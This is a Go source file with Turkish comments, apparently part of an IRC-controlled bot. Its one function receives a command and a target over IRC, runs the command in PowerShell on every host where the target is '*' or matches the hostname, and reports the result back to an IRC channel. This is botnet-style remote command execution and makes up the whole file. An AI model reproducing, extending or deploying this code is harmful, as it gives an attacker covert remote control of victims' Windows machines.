package main

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/thoj/go-ircevent"
)

//ExecCommand Komut çalıştırır
func ExecCommand(command string,target string, ircConnection *irc.Connection) {
	hostname, err := os.Hostname()
	if err == nil && (target == "*" || target == hostname) {
		fmt.Println("sa")
		binary, _ := exec.LookPath("powershell")
		_,err := exec.Command(binary , command).Output()
		if err == nil {
			ircConnection.Privmsg(channel, command + " PowerShell Komutu başarıyla çalıştırıldı!")
		} else {
			ircConnection.Privmsg(channel, fmt.Sprintf("%s Komutu Hata: %s", command,err.Error()))
		}
	}
}